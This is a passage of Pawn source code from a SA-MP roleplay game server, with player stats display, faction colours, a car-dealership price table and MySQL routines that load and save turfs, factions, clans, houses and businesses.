        SendClientMessage(playerid, COLOR_CRS2,coordsstring);
        if (PlayerInfo[targetid][pMember] == 1 || PlayerInfo[targetid][pLeader] == 1 || PlayerInfo[targetid][pMember] == 2 || PlayerInfo[targetid][pLeader] == 2 || PlayerInfo[targetid][pMember] == 3 || PlayerInfo[targetid][pLeader] == 3 || PlayerInfo[targetid][pMember] == 20 || PlayerInfo[targetid][pLeader] == 20)
        {
        format(coordsstring, sizeof(coordsstring), "Faction Stats: Lawyer Points:[%d]", lawyerpoint);
        SendClientMessage(playerid, COLOR_CRS2,coordsstring);
        }
        if (PlayerInfo[playerid][pAdmin] >= 1)
        {
            format(coordsstring, sizeof(coordsstring), "House:[%d] Biz:[%d] Car:[%d] Car2:[%d] HireKey:[%d] Interior:[%d] VirtualWorld:[%d]",hkey,bkey,ckey,ckey2,RentedVehicle[targetid],GetPlayerInterior(targetid),GetPlayerVirtualWorld(targetid));
            SendClientMessage(playerid, COLOR_WHITE,coordsstring);
            format(coordsstring, sizeof(coordsstring), "Lawyer Points:[%d] Mahal:[%d] TooHouse[%d] TooBiz[%d] Email:[%s]", lawyerpoint,Mahal[targetid],TooHouse[targetid],TooBiz[targetid],PlayerInfo[targetid][pEmail]);
            SendClientMessage(playerid, COLOR_WHITE,coordsstring);
        }
        SendClientMessage(playerid, CRISTIAN,"_______________________________________________");
    }
}
//---------------------------------------------------------

public SetPlayerToTeamColor(playerid)
{
    if(IsPlayerConnected(playerid))
    {
        SetPlayerColor(playerid,TEAM_HIT_COLOR); // white
        if (PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pLeader] == 1) SetPlayerColor(playerid,COLOR_PD);
        if (PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pLeader] == 2) SetPlayerColor(playerid,COLOR_FBI);
        if (PlayerInfo[playerid][pMember] == 3 || PlayerInfo[playerid][pLeader] == 3) SetPlayerColor(playerid,0x2c4c9bFF);
        if (PlayerInfo[playerid][pMember] == 4 || PlayerInfo[playerid][pLeader] == 4) SetPlayerColor(playerid,COLOR_MEDIC);
        if (PlayerInfo[playerid][pMember] == 5 || PlayerInfo[playerid][pLeader] == 5) SetPlayerColor(playerid,0x5D7E8D00);
        if (PlayerInfo[playerid][pMember] == 6 || PlayerInfo[playerid][pLeader] == 6) SetPlayerColor(playerid,0x3E3535FF);
        if (PlayerInfo[playerid][pMember] == 7 || PlayerInfo[playerid][pLeader] == 7) SetPlayerColor(playerid,0xBBF06000);
        if (PlayerInfo[playerid][pMember] == 8 || PlayerInfo[playerid][pLeader] == 8) SetPlayerColor(playerid,0x8E232300);
        if (PlayerInfo[playerid][pMember] == 9 || PlayerInfo[playerid][pLeader] == 9) SetPlayerColor(playerid,0x825B8CFF);
        if (PlayerInfo[playerid][pMember] == 10 || PlayerInfo[playerid][pLeader] == 10) SetPlayerColor(playerid,COLOR_TAXI);
        if (PlayerInfo[playerid][pMember] == 11 || PlayerInfo[playerid][pLeader] == 11) SetPlayerColor(playerid,COLOR_SI);
        if (PlayerInfo[playerid][pMember] == 12 || PlayerInfo[playerid][pLeader] == 12) SetPlayerColor(playerid,0x19AF2300);
        if (PlayerInfo[playerid][pMember] == 13 || PlayerInfo[playerid][pLeader] == 13) SetPlayerColor(playerid,0xFFBA0000);
        if (PlayerInfo[playerid][pMember] == 14 || PlayerInfo[playerid][pLeader] == 14) SetPlayerColor(playerid,0xB32CF600);
		if (PlayerInfo[playerid][pMember] == 15 || PlayerInfo[playerid][pLeader] == 15) SetPlayerColor(playerid,0x00ECEC00);
        if (PlayerInfo[playerid][pMember] == 16 || PlayerInfo[playerid][pLeader] == 16) SetPlayerColor(playerid,0xF9F7CE00);
        if (PlayerInfo[playerid][pMember] == 17 || PlayerInfo[playerid][pLeader] == 17) SetPlayerColor(playerid,0xF9F7CE00);
		if (PlayerInfo[playerid][pMember] == 19 || PlayerInfo[playerid][pLeader] == 19) SetPlayerColor(playerid,0x0E47FF00);
		if (PlayerInfo[playerid][pMember] == 20 || PlayerInfo[playerid][pLeader] == 20) SetPlayerColor(playerid,COLOR_SFPD);
    }
}
/*----------------------------------------------------------------------------*/
public LoadStuff()
{
    print("+ Loading Stuff");
    mysql_function_query(handle,"SELECT * FROM `server`",true,"OnStuffLoad","");
    return 1;
}
forward OnStuffLoad();
public OnStuffLoad()
{
    Jackpot = cache_get_row_int(0,0,handle);
    Tax = cache_get_row_int(0,1,handle);
    TaxValue = cache_get_row_int(0,2,handle);
    MostPlayersOnline = cache_get_row_int(0,4,handle);
    cache_get_row(0,5,DateOfRekord,handle,60);
    new loadstuf[256];
    format(loadstuf,256,"- All Stuff Loaded: JacpotValue: %d Tax: %d TaxValue: %d MostPlayersOnline: %d",Jackpot,Tax,TaxValue,MostPlayersOnline);
    print(loadstuf);
    return 1;
}
public SaveStuff()
{
    new query[256];
    format(query,256,"UPDATE `server` SET jackpotvalue='%d',Tax='%d',TaxValue='%d',MostPlayersOnline='%d',DateOfRekord='%s'",Jackpot,Tax,TaxValue,MostPlayersOnline,DateOfRekord);
    mysql_function_query(handle,query,false,"SendQuery","");
    return 1;
}
/*----------------------------------------------------------------------------*/
public LoadTurfs()
{
    print("+ Loading Turfs");
    mysql_function_query(handle,"SELECT * FROM `turfs`",true,"OnTurfsLoad","");
    return 1;
}
okkon(playerid, id) {
switch(id) {
			case 1: { IWantCar[playerid] = 509; PriceCar[playerid] = 1000; VehModKharid[playerid] = 0;} // bike
            case 2: { IWantCar[playerid] = 481; PriceCar[playerid] = 1000; VehModKharid[playerid] = 0;}
            case 3: { IWantCar[playerid] = 510; PriceCar[playerid] = 2000; VehModKharid[playerid] = 0;}
            case 4: { IWantCar[playerid] = 462; PriceCar[playerid] = 3000; VehModKharid[playerid] = 0;}
            case 5: { IWantCar[playerid] = 404; PriceCar[playerid] = 6000; VehModKharid[playerid] = 0;}
            case 6: { IWantCar[playerid] = 413; PriceCar[playerid] = 7000; VehModKharid[playerid] = 0;}
            case 7: { IWantCar[playerid] = 527; PriceCar[playerid] = 8000; VehModKharid[playerid] = 0;}
            case 8: { IWantCar[playerid] = 410; PriceCar[playerid] = 9000; VehModKharid[playerid] = 0;}
            case 9: { IWantCar[playerid] = 418; PriceCar[playerid] = 10000; VehModKharid[playerid] = 0;}
            case 10: { IWantCar[playerid] = 549; PriceCar[playerid] = 11000; VehModKharid[playerid] = 0;}
            case 11: { IWantCar[playerid] = 422; PriceCar[playerid] = 12000; VehModKharid[playerid] = 0;}
            case 12: { IWantCar[playerid] = 401; PriceCar[playerid] = 13000; VehModKharid[playerid] = 0;}
            case 13: { IWantCar[playerid] = 543; PriceCar[playerid] = 14000; VehModKharid[playerid] = 0;}
            case 14: { IWantCar[playerid] = 436; PriceCar[playerid] = 17000; VehModKharid[playerid] = 0;}
            case 15: { IWantCar[playerid] = 542; PriceCar[playerid] = 18000; VehModKharid[playerid] = 0;}
            case 16: { IWantCar[playerid] = 547; PriceCar[playerid] = 19000; VehModKharid[playerid] = 0;}
            case 17: { IWantCar[playerid] = 400; PriceCar[playerid] = 21000; VehModKharid[playerid] = 0;}
            case 18: { IWantCar[playerid] = 550; PriceCar[playerid] = 22000; VehModKharid[playerid] = 0;}
            case 19: { IWantCar[playerid] = 466; PriceCar[playerid] = 23000; VehModKharid[playerid] = 0;}
            case 20: { IWantCar[playerid] = 424; PriceCar[playerid] = 25000; VehModKharid[playerid] = 0;}
            case 21: { IWantCar[playerid] = 439; PriceCar[playerid] = 25000; VehModKharid[playerid] = 0;}
            case 22: { IWantCar[playerid] = 516; PriceCar[playerid] = 26000; VehModKharid[playerid] = 0;}
            case 23: { IWantCar[playerid] = 473; PriceCar[playerid] = 27000; VehModKharid[playerid] = 1;}
            case 24: { IWantCar[playerid] = 419; PriceCar[playerid] = 29000; VehModKharid[playerid] = 0;}
            case 25: { IWantCar[playerid] = 467; PriceCar[playerid] = 29000; VehModKharid[playerid] = 0;}
            case 26: { IWantCar[playerid] = 517; PriceCar[playerid] = 32000; VehModKharid[playerid] = 0;}
            case 27: { IWantCar[playerid] = 474; PriceCar[playerid] = 34000; VehModKharid[playerid] = 0;}
            case 28: { IWantCar[playerid] = 492; PriceCar[playerid] = 36000; VehModKharid[playerid] = 0;}
            case 29: { IWantCar[playerid] = 518; PriceCar[playerid] = 42000; VehModKharid[playerid] = 0;}
            case 30: { IWantCar[playerid] = 491; PriceCar[playerid] = 43000; VehModKharid[playerid] = 0;}
            case 31: { IWantCar[playerid] = 496; PriceCar[playerid] = 51000; VehModKharid[playerid] = 0;}
            case 32: { IWantCar[playerid] = 479; PriceCar[playerid] = 58000; VehModKharid[playerid] = 0;}
            case 33: { IWantCar[playerid] = 526; PriceCar[playerid] = 78000; VehModKharid[playerid] = 0;}
            case 34: { IWantCar[playerid] = 471; PriceCar[playerid] = 83000; VehModKharid[playerid] = 0;}
            case 35: { IWantCar[playerid] = 545; PriceCar[playerid] = 84000; VehModKharid[playerid] = 0;}
            case 36: { IWantCar[playerid] = 445; PriceCar[playerid] = 90000; VehModKharid[playerid] = 0;}
            case 37: { IWantCar[playerid] = 412; PriceCar[playerid] = 90000; VehModKharid[playerid] = 0;}
            case 38: { IWantCar[playerid] = 529; PriceCar[playerid] = 114000; VehModKharid[playerid] = 0;}
            case 39: { IWantCar[playerid] = 540; PriceCar[playerid] = 133000; VehModKharid[playerid] = 0;}
            case 40: { IWantCar[playerid] = 500; PriceCar[playerid] = 146000; VehModKharid[playerid] = 0;}
            case 41: { IWantCar[playerid] = 603; PriceCar[playerid] = 180000; VehModKharid[playerid] = 0;}
            case 42: { IWantCar[playerid] = 546; PriceCar[playerid] = 184000; VehModKharid[playerid] = 0;}
            case 43: { IWantCar[playerid] = 458; PriceCar[playerid] = 187000; VehModKharid[playerid] = 0;}
            case 44: { IWantCar[playerid] = 566; PriceCar[playerid] = 194000; VehModKharid[playerid] = 0;}
            case 45: { IWantCar[playerid] = 405; PriceCar[playerid] = 200000; VehModKharid[playerid] = 0;}
            case 46: { IWantCar[playerid] = 581; PriceCar[playerid] = 205000; VehModKharid[playerid] = 0;}
            case 47: { IWantCar[playerid] = 421; PriceCar[playerid] = 230000; VehModKharid[playerid] = 0;}
            case 48: { IWantCar[playerid] = 489; PriceCar[playerid] = 235000; VehModKharid[playerid] = 0;}
            case 49: { IWantCar[playerid] = 463; PriceCar[playerid] = 239000; VehModKharid[playerid] = 0;}
            case 50: { IWantCar[playerid] = 551; PriceCar[playerid] = 240000; VehModKharid[playerid] = 0;}
            case 51: { IWantCar[playerid] = 468; PriceCar[playerid] = 250000; VehModKharid[playerid] = 0;}
            case 52: { IWantCar[playerid] = 452; PriceCar[playerid] = 260000; VehModKharid[playerid] = 1; }
            case 53: { IWantCar[playerid] = 576; PriceCar[playerid] = 275000; VehModKharid[playerid] = 0;}
            case 54: { IWantCar[playerid] = 507; PriceCar[playerid] = 281000; VehModKharid[playerid] = 0;}
            case 55: { IWantCar[playerid] = 426; PriceCar[playerid] = 310000; VehModKharid[playerid] = 0;}
            case 56: { IWantCar[playerid] = 461; PriceCar[playerid] = 326000; VehModKharid[playerid] = 0;}
            case 57: { IWantCar[playerid] = 589; PriceCar[playerid] = 345000; VehModKharid[playerid] = 0;}
            case 58: { IWantCar[playerid] = 602; PriceCar[playerid] = 368000; VehModKharid[playerid] = 0;}
            case 59: { IWantCar[playerid] = 475; PriceCar[playerid] = 385000; VehModKharid[playerid] = 0;}
            case 60: { IWantCar[playerid] = 587; PriceCar[playerid] = 399000; VehModKharid[playerid] = 0;}
            case 61: { IWantCar[playerid] = 580; PriceCar[playerid] = 410000; VehModKharid[playerid] = 0;}
            case 62: { IWantCar[playerid] = 469; PriceCar[playerid] = 420000; VehModKharid[playerid] = 2; }
            case 63: { IWantCar[playerid] = 454; PriceCar[playerid] = 455000; VehModKharid[playerid] = 1; }
            case 64: { IWantCar[playerid] = 555; PriceCar[playerid] = 475000; VehModKharid[playerid] = 0;}
            case 65: { IWantCar[playerid] = 579; PriceCar[playerid] = 512000; VehModKharid[playerid] = 0;}
            case 66: { IWantCar[playerid] = 558; PriceCar[playerid] = 530000; VehModKharid[playerid] = 0;}
            case 67: { IWantCar[playerid] = 534; PriceCar[playerid] = 530000; VehModKharid[playerid] = 0;}
            case 68: { IWantCar[playerid] = 446; PriceCar[playerid] = 540000; VehModKharid[playerid] = 1; }
            case 69: { IWantCar[playerid] = 533; PriceCar[playerid] = 562000; VehModKharid[playerid] = 0;}
            case 70: { IWantCar[playerid] = 535; PriceCar[playerid] = 596000; VehModKharid[playerid] = 0;}
            case 71: { IWantCar[playerid] = 536; PriceCar[playerid] = 615000; VehModKharid[playerid] = 0;}
            case 72: { IWantCar[playerid] = 575; PriceCar[playerid] = 625000; VehModKharid[playerid] = 0;}
            case 73: { IWantCar[playerid] = 565; PriceCar[playerid] = 630000; VehModKharid[playerid] = 0;}
            case 74: { IWantCar[playerid] = 493; PriceCar[playerid] = 630000; VehModKharid[playerid] = 1; }
            case 75: { IWantCar[playerid] = 521; PriceCar[playerid] = 631000; VehModKharid[playerid] = 0;}
            case 76: { IWantCar[playerid] = 434; PriceCar[playerid] = 640000; VehModKharid[playerid] = 0;}
            case 77: { IWantCar[playerid] = 477; PriceCar[playerid] = 680000; VehModKharid[playerid] = 0;}
            case 78: { IWantCar[playerid] = 567; PriceCar[playerid] = 695000; VehModKharid[playerid] = 0;}
            case 79: { IWantCar[playerid] = 506; PriceCar[playerid] = 750000; VehModKharid[playerid] = 0;}
            case 80: { IWantCar[playerid] = 487; PriceCar[playerid] = 755000; VehModKharid[playerid] = 2; }
            case 81: { IWantCar[playerid] = 495; PriceCar[playerid] = 768000; VehModKharid[playerid] = 0;}
            case 82: { IWantCar[playerid] = 402; PriceCar[playerid] = 780000; VehModKharid[playerid] = 0;}
            case 83: { IWantCar[playerid] = 559; PriceCar[playerid] = 785000; VehModKharid[playerid] = 0;}
            case 84: { IWantCar[playerid] = 480; PriceCar[playerid] = 799000; VehModKharid[playerid] = 0;}
            case 85: { IWantCar[playerid] = 560; PriceCar[playerid] = 830000; VehModKharid[playerid] = 0;}
            case 86: { IWantCar[playerid] = 562; PriceCar[playerid] = 840000; VehModKharid[playerid] = 0;}
            case 87: { IWantCar[playerid] = 415; PriceCar[playerid] = 860000; VehModKharid[playerid] = 0;}
            case 88: { IWantCar[playerid] = 451; PriceCar[playerid] = 910000; VehModKharid[playerid] = 0;}
            case 89: { IWantCar[playerid] = 522; PriceCar[playerid] = 940000; VehModKharid[playerid] = 0;}
            case 90: { IWantCar[playerid] = 429; PriceCar[playerid] = 950000; VehModKharid[playerid] = 0;}
            case 91: { IWantCar[playerid] = 541; PriceCar[playerid] = 1115000; VehModKharid[playerid] = 0;}
            case 92: { IWantCar[playerid] = 411; PriceCar[playerid] = 1250000; VehModKharid[playerid] = 0;}
			case 93: { IWantCar[playerid] = 494; PriceCar[playerid] = 3000000; VehModKharid[playerid] = 0;}
			case 94: { IWantCar[playerid] = 502; PriceCar[playerid] = 3000000; VehModKharid[playerid] = 0;}
			case 95: { IWantCar[playerid] = 503; PriceCar[playerid] = 3000000; VehModKharid[playerid] = 0;}
			case 96: { IWantCar[playerid] = 444; PriceCar[playerid] = 3000000; VehModKharid[playerid] = 0;}
			case 97: { IWantCar[playerid] = 556; PriceCar[playerid] = 3000000; VehModKharid[playerid] = 0;}
			case 98: { IWantCar[playerid] = 557; PriceCar[playerid] = 3000000; VehModKharid[playerid] = 0;}


}
HalKon(playerid, IWantCar[playerid]);
}
HalKon(playerid, id) {
new Float:x,Float:y,Float:z;
GetPlayerPos(playerid, x, y, z);
vhid[playerid] = CreateVehicle(id, -1951.861694,261.092132,35.555885, 52.807670, 1, 5, -1);
new string[512];
new vehicless = GetVehicleModel(vhid[playerid]) - 400;
format(string, sizeof(string), "Model:_%s", aVehicleNames[vehicless]);
new pr[512];
format(pr, sizeof(pr), "Price:_%s$", FormatNumber(PriceCar[playerid]));

PlayerTextDrawSetString(playerid, PriceModel[playerid], pr);
PlayerTextDrawSetString(playerid, CarModel[playerid], string);
if(playerid == 0) {
SetVehicleVirtualWorld(vhid[playerid], 10000);
LockEngine[vhid[playerid]] = true;
}
else {
SetVehicleVirtualWorld(vhid[playerid], playerid);
}
PutPlayerInVehicle(playerid, vhid[playerid], 0);
}
ChangeRot(playerid, id) {
if(id == 0) {
SetVehicleZAngle(vhid[playerid], 52.807670)
}
else if(id == 1) {
SetVehicleZAngle(vhid[playerid], 359.454284);
}
else if(id == 2) {
SetVehicleZAngle(vhid[playerid], 314.798553);
}
else if(id == 3) {
SetVehicleZAngle(vhid[playerid], 271.906097);
}
else if(id == 4) {
SetVehicleZAngle(vhid[playerid], 223.725540);
}
else if(id == 5) {
SetVehicleZAngle(vhid[playerid], 182.008193);
}
else if(id == 6) {
SetVehicleZAngle(vhid[playerid], 129.714614);
}
else if(id == 7) {
SetVehicleZAngle(vhid[playerid], 87.997268);
}
}
forward OnTurfsLoad();
public OnTurfsLoad()
{
	for(new i = 0;i<cache_get_row_count(handle);i++)
	{
		TurfInfo[i][zSQLid] = i;
		cache_get_row(i,1,TurfInfo[i][zOwner],handle,64);
		TurfInfo[i][zMinX] = cache_get_row_float(i,2,handle);
		TurfInfo[i][zMinY] = cache_get_row_float(i,3,handle);
		TurfInfo[i][zMaxX] = cache_get_row_float(i,4,handle);
		TurfInfo[i][zMaxY] = cache_get_row_float(i,5,handle);
	}
    for(new i = 0; i < sizeof(TurfInfo); i++)
    {
        Turfs[i] = GangZoneCreate(TurfInfo[i][zMinX],TurfInfo[i][zMinY],TurfInfo[i][zMaxX],TurfInfo[i][zMaxY]);
        TurfAttacker[i] = 9999;
        TurfKhod[i] = 9999;
        KillsAttackerTurf[i] = 0;
        DeathsAttackerTurf[i] = 0;
        KillsKhodTurf[i] = 0;
        DeathsKhodTurf[i] = 0;
        ScoreAttacker[i] = 0;
        ScoreKhod[i] = 0;
        TurfTime[i] = 0;
		gID[0] = GangZoneCreate(85.50,-1875.5000,95.5000,-875.5000);
	    gID[1] = GangZoneCreate(85.50,-1875.50,2860.50,-1865.50);
	    gID[2] = GangZoneCreate(85.50,-875.5000,2860.5000,-865.0000);
		gID[3] = GangZoneCreate(85.50,-1530.5000,2860.5000,-1520.5000);
		gID[4] = GangZoneCreate(2860.50,-2735.00,2870.50,-865.00);
		gID[5] = GangZoneCreate(1035.00,-2735.00,2870.50,-2725.00);
		gID[6] = GangZoneCreate(1035.00,-2735.00,1045.00,-865.00);
		gID[7] = GangZoneCreate(540.00,-1875.50,550.00,-865.00);
		gID[8] = GangZoneCreate(1435.00,-2735.00,1445.00,-865.00);
		gID[9] = GangZoneCreate(1815.00,-2735.00,1825.00,-865.00);
		gID[10] = GangZoneCreate(2165.00,-2735.00,2175.00,-865.00);
		gID[11] = GangZoneCreate(2500.00,-2735.00,2510.000,-865.00);
		gID[12] = GangZoneCreate(1035.00,-2270.00,2870.50,-2260.00);
		gID[13] = GangZoneCreate(85.50,-1235.0000,2860.5000,-1225.00);
    }
	print("- All Turfs Loaded.");
	return 1;
}
public SaveTurfs(turfid)
{
    new query[256];
    format(query,256,"UPDATE `turfs` SET zOwner='%s' WHERE `id`='%d'",TurfInfo[turfid][zOwner],turfid);
    mysql_function_query(handle,query,false,"SendQuery","");
/*    format(query,256,"UPDATE `turfs` SET zMinX='%.4f' WHERE `id`='%d'",TurfInfo[turfid][zMinX],turfid);
    mysql_function_query(handle,query,false,"SendQuery","");
    format(query,256,"UPDATE `turfs` SET zMinY='%.4f' WHERE `id`='%d'",TurfInfo[turfid][zMinY],turfid);
    mysql_function_query(handle,query,false,"SendQuery","");
    format(query,256,"UPDATE `turfs` SET zMaxX='%.4f' WHERE `id`='%d'",TurfInfo[turfid][zMaxX],turfid);
    mysql_function_query(handle,query,false,"SendQuery","");
    format(query,256,"UPDATE `turfs` SET zMaxY='%.4f' WHERE `id`='%d'",TurfInfo[turfid][zMaxY],turfid);
    mysql_function_query(handle,query,false,"SendQuery","");
    format(query,256,"UPDATE `turfs` SET zMaxY='%.4f' WHERE `id`='%d'",TurfInfo[turfid][zMaxY],turfid);
    mysql_function_query(handle,query,false,"SendQuery","");
    format(query,256,"UPDATE `turfs` SET zMaxY='%.4f' WHERE `id`='%d'",TurfInfo[turfid][zMaxY],turfid);
    mysql_function_query(handle,query,false,"SendQuery","");
    format(query,256,"UPDATE `turfs` SET zMaxY='%.4f' WHERE `id`='%d'",TurfInfo[turfid][zMaxY],turfid);
    mysql_function_query(handle,query,false,"SendQuery","");
    format(query,256,"UPDATE `turfs` SET zMaxY='%.4f' WHERE `id`='%d'",TurfInfo[turfid][zMaxY],turfid);
    mysql_function_query(handle,query,false,"SendQuery","");
    format(query,256,"UPDATE `turfs` SET zMaxY='%.4f' WHERE `id`='%d'",TurfInfo[turfid][zMaxY],turfid);
    mysql_function_query(handle,query,false,"SendQuery","");
    format(query,256,"UPDATE `turfs` SET zMaxY='%.4f' WHERE `id`='%d'",TurfInfo[turfid][zMaxY],turfid);
    mysql_function_query(handle,query,false,"SendQuery","");
    format(query,256,"UPDATE `turfs` SET zMaxY='%.4f' WHERE `id`='%d'",TurfInfo[turfid][zMaxY],turfid);
    mysql_function_query(handle,query,false,"SendQuery","");
    format(query,256,"UPDATE `turfs` SET zMaxY='%.4f' WHERE `id`='%d'",TurfInfo[turfid][zMaxY],turfid);
    mysql_function_query(handle,query,false,"SendQuery","");
    format(query,256,"UPDATE `turfs` SET zMaxY='%.4f' WHERE `id`='%d'",TurfInfo[turfid][zMaxY],turfid);
    mysql_function_query(handle,query,false,"SendQuery","");
    format(query,256,"UPDATE `turfs` SET zMaxY='%.4f' WHERE `id`='%d'",TurfInfo[turfid][zMaxY],turfid);
    mysql_function_query(handle,query,false,"SendQuery","");
    format(query,256,"UPDATE `turfs` SET zMaxY='%.4f' WHERE `id`='%d'",TurfInfo[turfid][zMaxY],turfid);
    mysql_function_query(handle,query,false,"SendQuery","");
    format(query,256,"UPDATE `turfs` SET zMaxY='%.4f' WHERE `id`='%d'",TurfInfo[turfid][zMaxY],turfid);
    mysql_function_query(handle,query,false,"SendQuery","");
    format(query,256,"UPDATE `turfs` SET zMaxY='%.4f' WHERE `id`='%d'",TurfInfo[turfid][zMaxY],turfid);
    mysql_function_query(handle,query,false,"SendQuery","");
    format(query,256,"UPDATE `turfs` SET zMaxY='%.4f' WHERE `id`='%d'",TurfInfo[turfid][zMaxY],turfid);
    mysql_function_query(handle,query,false,"SendQuery","");*/
    return 1;
}
/*----------------------------------------------------------------------------*/
public LoadDynamicFactions()
{
    print("+ Loading Factions/Families");
    mysql_function_query(handle,"SELECT * FROM `factions`",true,"OnDynamicFactionsLoad","");
    return 1;
}
forward OnDynamicFactionsLoad();
public OnDynamicFactionsLoad()
{
for(new i = 0;i<cache_get_row_count(handle); i++)
{
DynamicFactions[i][fSQLid] = i;
cache_get_row(i,1,DynamicFactions[i][fName],handle,50);
DynamicFactions[i][ffX] = cache_get_row_float(i,2,handle);
DynamicFactions[i][ffY] = cache_get_row_float(i,3,handle);
DynamicFactions[i][ffZ] = cache_get_row_float(i,4,handle);
DynamicFactions[i][fMats] = cache_get_row_int(i,5,handle);
DynamicFactions[i][fDrugs] = cache_get_row_int(i,6,handle);
DynamicFactions[i][fBank] = cache_get_row_int(i,7,handle);
}
print("- All Dynamic Factions Loaded.");
return 1;
}
public SaveDynamicFactions(factionid)
{
new query[256];
format(query,256,"UPDATE `factions` SET fName='%s' WHERE `id`='%d'",DynamicFactions[factionid][fName],factionid);
mysql_function_query(handle,query,false,"SendQuery","");
format(query,256,"UPDATE `factions` SET fX='%.4f' WHERE `id`='%d'",DynamicFactions[factionid][ffX],factionid);
mysql_function_query(handle,query,false,"SendQuery","");
format(query,256,"UPDATE `factions` SET fY='%.4f' WHERE `id`='%d'",DynamicFactions[factionid][ffY],factionid);
mysql_function_query(handle,query,false,"SendQuery","");
format(query,256,"UPDATE `factions` SET fZ='%.4f' WHERE `id`='%d'",DynamicFactions[factionid][ffZ],factionid);
mysql_function_query(handle,query,false,"SendQuery","");
format(query,256,"UPDATE `factions` SET fMats='%d' WHERE `id`='%d'",DynamicFactions[factionid][fMats],factionid);
mysql_function_query(handle,query,false,"SendQuery","");
format(query,256,"UPDATE `factions` SET fDrugs='%d' WHERE `id`='%d'",DynamicFactions[factionid][fDrugs],factionid);
mysql_function_query(handle,query,false,"SendQuery","");
format(query,256,"UPDATE `factions` SET fBank='%d' WHERE `id`='%d'",DynamicFactions[factionid][fBank],factionid);
mysql_function_query(handle,query,false,"SendQuery","");
return 1;
}

// Clan DB

public LoadDynamicClans()
{
    print("+ Loading Clans");
    mysql_function_query(handle,"SELECT * FROM `clans`",true,"OnDynamicClansLoad","");
    return 1;
}
forward OnDynamicClansLoad();
public OnDynamicClansLoad()
{
for(new i = 0;i<cache_get_row_count(handle); i++)
{
DynamicClans[i][cSQLid] = i;
cache_get_row(i,1,DynamicClans[i][cName],handle,50);
cache_get_row(i,2,DynamicClans[i][cTag],handle,50);
DynamicClans[i][cSlot] = cache_get_row_int(i,3,handle);
DynamicClans[i][cSlots] = cache_get_row_int(i,4,handle);
}
print("- All Clans Loaded.");
return 1;
}
public SaveDynamicClans(cid)
{
new query[256];
format(query,256,"UPDATE `clans` SET cName='%s' WHERE `cSQLid`='%d'",DynamicClans[cid][cName],cid);
mysql_function_query(handle,query,false,"SendQuery","");
format(query,256,"UPDATE `clans` SET cTag='%s' WHERE `cSQLid`='%d'",DynamicClans[cid][cTag],cid);
mysql_function_query(handle,query,false,"SendQuery","");
format(query,256,"UPDATE `clans` SET cSlot='%d' WHERE `cSQLid`='%d'",DynamicClans[cid][cSlot],cid);
mysql_function_query(handle,query,false,"SendQuery","");
format(query,256,"UPDATE `clans` SET cSlots='%d' WHERE `cSQLid`='%d'",DynamicClans[cid][cSlots],cid);
mysql_function_query(handle,query,false,"SendQuery","");
return 1;
}

// End Clan DB
public LoadHouses()
{
    print("+ Loading Houses\n");
    mysql_function_query(handle,"SELECT * FROM `houses`",true,"OnHouseLoad","");
    return 1;
}


public OnHouseLoad()
{
print("- All Houses Loaded.");
    for(new i = 0;i<cache_get_row_count(handle);i++)
    {
        HouseInfo[i][hSQLID] = i;
        HouseInfo[i][hEntrancex] = cache_get_row_float(i,1,handle);
        HouseInfo[i][hEntrancey] = cache_get_row_float(i,2,handle);
		HouseInfo[i][hEntrancez] = cache_get_row_float(i,3,handle);
        HouseInfo[i][hExitx] = cache_get_row_float(i,4,handle);
        HouseInfo[i][hExity] = cache_get_row_float(i,5,handle);
        HouseInfo[i][hExitz] = cache_get_row_float(i,6,handle);
        cache_get_row(i,7,HouseInfo[i][hOwner],handle,MAX_PLAYER_NAME);
        HouseInfo[i][hValue] = cache_get_row_int(i,8,handle);
        HouseInfo[i][hHel] = cache_get_row_int(i,9,handle);
        HouseInfo[i][hInt] = cache_get_row_int(i,10,handle);
        HouseInfo[i][hLock] = cache_get_row_int(i,11,handle);
        HouseInfo[i][hOwned] = cache_get_row_int(i,12,handle);
        HouseInfo[i][hRent] = cache_get_row_int(i,13,handle);
        HouseInfo[i][hRentabil] = cache_get_row_int(i,14,handle);
        HouseInfo[i][hTakings] = cache_get_row_int(i,15,handle);
        HouseInfo[i][hLevel] = cache_get_row_int(i,16,handle);
        HouseInfo[i][hWorld] = cache_get_row_int(i,17,handle);
        HouseInfo[i][hForosh] = cache_get_row_int(i,18,handle);
//    	print("\n* All Houses Details Loaded.");
        houser[i] = CreateDynamic3DTextLabel("Loading Info ...",COLOR_LIGHTGREENN,HouseInfo[i][hExitx],HouseInfo[i][hExity],HouseInfo[i][hExitz],20.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,-1,-1,-1,20.0);
//    	print("\n** All Houses Details Loaded.");
		CreateDynamicPickup(1273,1,HouseInfo[i][hExitx],HouseInfo[i][hExity],HouseInfo[i][hExitz],-1,-1,-1,50.0);
		if(HouseInfo[i][hValue] <= 5000) printf("Khone id %d Dorost Load Nashod.",i);
//    	print("\n*** All Houses Details Loaded.");
    }
    print("/nAll Houses Loaded./n");
    return 1;
}


public LoadBizz()
{
    print("+ Loading Bussineses");
    mysql_function_query(handle,"SELECT * FROM `bizzes`",true,"OnBizzLoad","");
    return 1;
}
forward OnBizzLoad();
public OnBizzLoad()
{
    for(new i = 0;i<cache_get_row_count(handle); i++)
    {
        BizzInfo[i][bSQLid] = i;
        BizzInfo[i][bOwned] = cache_get_row_int(i,1,handle);
        cache_get_row(i,2,BizzInfo[i][bOwner],handle,64);
        cache_get_row(i,3,BizzInfo[i][bMessage],handle,128);
        BizzInfo[i][bEntranceX] = cache_get_row_float(i,4,handle);
        BizzInfo[i][bEntranceY] = cache_get_row_float(i,5,handle);
        BizzInfo[i][bEntranceZ] = cache_get_row_float(i,6,handle);
        BizzInfo[i][bExitX] = cache_get_row_float(i,7,handle);
        BizzInfo[i][bExitY] = cache_get_row_float(i,8,handle);
        BizzInfo[i][bExitZ] = cache_get_row_float(i,9,handle);
        BizzInfo[i][bLevelNeeded] = cache_get_row_int(i,10,handle);
        BizzInfo[i][bBuyPrice] = cache_get_row_int(i,11,handle);
        BizzInfo[i][bEntranceCost] = cache_get_row_int(i,12,handle);
        BizzInfo[i][bTill] = cache_get_row_int(i,13,handle);
        BizzInfo[i][bLocked] = cache_get_row_int(i,14,handle);
        BizzInfo[i][bInterior] = cache_get_row_int(i,15,handle);
        BizzInfo[i][bProducts] = cache_get_row_int(i,16,handle);
        BizzInfo[i][bMaxProducts] = cache_get_row_int(i,17,handle);
        BizzInfo[i][bPriceProd] = cache_get_row_int(i,18,handle);
        BizzInfo[i][bVW] = cache_get_row_int(i,19,handle);
